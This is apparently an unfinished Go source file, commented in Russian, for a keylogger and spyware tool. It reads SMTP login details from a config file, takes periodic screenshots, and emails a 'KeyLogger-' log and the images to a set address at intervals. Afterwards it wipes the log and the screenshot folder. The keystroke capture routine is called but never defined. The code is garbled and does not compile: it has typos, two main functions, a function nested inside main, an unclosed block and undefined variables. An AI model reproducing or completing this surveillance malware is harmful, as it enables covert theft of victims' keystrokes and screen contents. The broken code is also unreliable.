package main

import (
	"fmt"
	"image/png"
	"io/ioutil"
	"log"
	"os"
	"time"
	"bufio"
	"strings"
	"strconv"
	screenshot "github.com/vova616/screenshot"
	gomail "gopkg.in/gomail.v2"
)

var settings array
var email string
var pass string
var port_int int
var port_int1 int
var sbj string
var body string
var fld_key string
var fld_scr string
var email_relay int
var is_scr bool
vat time_now_str string
vat time_now_int int
var time_zip string
func main() {

file, _ := os.Open("config") //имя файла, откуда читаем настройки
f := bufio.NewReader(file)

fmt.Println("\nВаши настройки:")
settings, _ := f.ReadString(0)
fmt.Print(settings)
arr := strings.Split(settings, "\n")		// Массив с настройками,типа [set:val]...
fmt.Print("\n")

email := strings.Split(arr[0], ":") 		// Email login
pass := strings.Split(arr[1], ":")		// Email password
	
server := strings.Split(arr[2], ":")		// SMTP-сервер
port_str := strings.Split(arr[3], ":")		// SMTP-порт
port := port_str[1]				// SMTP-порт - адский конверт в int
port_int, _ := strconv.ParseInt(port, 10, 0)	// SMTP-порт - адский конверт в int
port_int1 = int(port_int)			// !SMTP-порт - адский конверт в int
	
to := strings.Split(arr[4], ":")		// E-mail получателя
sbj := strings.Split(arr[5], ":")		// Тема письма
body := strings.Split(arr[6], ":")		// Тело письма
	
fld_key := strings.Split(arr[7], ":")		// Папка хранения текстовых логов
fld_scr := strings.Split(arr[8], ":")		// Папка хранения скриншотов
	
email_relay := strings.Split(arr[9], ":")	// Задержка отправки почты в секундах, по умолчанию 14400
email_relay_int1 := email_relay[1]		// Задержка отправки почты в секундах - адский конверт в int
email_relay_int2, _ := strconv.ParseInt(email_relay_int1, 10, 0) // Задержка отправки почты в секундах - адский конверт в int
email_relay_int = int(email_relay_int2)		// !Задержка отправки почты в секундах - адский конверт в int
is_scr := strings.Split(arr[10], ":")		// Делать ли скриншоты - если 1 - да, 0 - нет
defer file.Close()
	
func getCurrentDate() string {
	time_now_str := time.Date(2009, time.November, 10, 23, 0, 0, 0, time.UTC)
}
fmt.Println(getCurrentDate())
fmt.Printf("Дата и время - %s\n", time_now_str.Local())
//письмо

m := gomail.NewMessage()
m.SetHeader("From", email[1])
m.SetHeader("To", to[1], email[1]) //!!!!!!!!!!!!!!
m.SetAddressHeader("", "", "")
m.SetHeader("Subject", sbj[1])
m.SetBody("text/html", body[1])
m.Attach(time_zip[1])

//отправка

d := gomail.NewDialer(server[1], port_int1, email[1], pass[1])

// Send the email to Bob, Cora and Dan.
if err := d.DialAndSend(m); err != nil {
panic(err)

/* const (
	// log file name по дням и папки
	// Save photo interval.
	savePhotoInterval = 10
)
*/
// Get file contents as string.
	/*
func fileGetContents(filename string) string {
	buf, _ := ioutil.ReadFile(filename)
	return string(buf)
}


// Send email.
func sendEmail(header, body string) {
	m := gomail.NewMessage()
	m.SetHeader("From", emailLogin)
	m.SetHeader("To", emailLogin, emailLogin)
	m.SetAddressHeader("", "", "")
	m.SetHeader("Subject", header)
	m.SetBody("text/html", body)

	d := gomail.NewDialer("smtp.mail.ru", 465, emailLogin, emailPass)

	if err := d.DialAndSend(m); err != nil {
		panic(err)
	}
}
*/
	/*
// Get current date format as DD.MM.YYYY
func getCurrentDate() string {
	return time.Now().Format("02.01.2006")
}

// Get current time format as HH:MM:SS
func getCurrentTime() string {
	return time.Now().Local().Format("15:04:05")
}
*/
// Write "" into file.
func clearFileContents(path string) {
	// open file using READ & WRITE permission
	var file, err = os.OpenFile(path, os.O_RDWR|os.O_TRUNC, 0777)
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()
	// write some text line-by-line to file
	_, err = file.WriteString("")
	if err != nil {
		fmt.Println(err)
	}
	// save changes
	err = file.Sync()
	if err != nil {
		fmt.Println(err)
	}
}

// Delete all elements in directory (screens directoty)
func clearDirectory(path string) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}

	for _, file := range files {
		os.Remove(screensHome + file.Name())
	}
}

// Check, is dir is empty
func isEmptyDir(path string) bool {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}
	if len(files) == 0 {
		return true
	}
	return false
}

// Send email every {seconds}
func intervalSendEmail(seconds int) {
	for {
		time.Sleep(time.Duration(seconds) * time.Second)

		filepath := spyhome + logFileName
		subj := "KeyLogger-" + getCurrentTime()
		body := fileGetContents(filepath)

		if body == "" {
			body = "Empty log file."
		}

		// If screens directory is empty
		if isEmptyDir(screensHome) {
			sendEmail(subj, body)
		} else {
			// Send email with screenshots
			files, err := ioutil.ReadDir(screensHome)
			if err != nil {
				log.Fatal(err)
			}
			arr := []string{}
			for _, item := range files {
				if !item.IsDir() {
					arr = append(arr, screensHome+item.Name())
				}
			}
			sendEmailWithAttach(subj, body, arr)
		}

		clearFileContents(filepath)
		clearDirectory(screensHome)
	}
}

// Capture screenshot every {seconds}
func intervalScreenShot(seconds int) {
	for {
		screenName := screensHome + "screen_" + getCurrentDate() + "_" + getCurrentTime() + ".png"
		makeScreenShot(screenName)
		time.Sleep(time.Duration(seconds) * time.Second)
	}
}

// Make screen shot ans save it as
func makeScreenShot(filename string) {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
}

// Append string to file.
func appendIntoFile(filename, content string) {
	// Chech file exists.
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		// Create file for loggin.
		f, err := os.Create(filename)
		if err != nil {
			panic(err)
		}
		defer f.Close()
	}

	file, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND, 0777)

	if err != nil {
		panic(err)
	}

	if _, err := file.WriteString(content); err != nil {
		panic(err)
	}

	defer file.Close()
}

func main() {
	// Create home directory for spy.
	if _, err := os.Stat(spyhome); os.IsNotExist(err) {
		os.Mkdir(spyhome, 0777)
	}
	// Create home directory for screens.
	if _, err := os.Stat(screensHome); os.IsNotExist(err) {
		os.Mkdir(screensHome, 0777)
	}

	if isScreenShot {
		// Set screen shot interval.
		go intervalScreenShot(savePhotoInterval)
	}

	go intervalSendEmail(sendEmailInterval)

	filename := spyhome + logFileName
	LogKeys(filename)
	os.Exit(0)
}
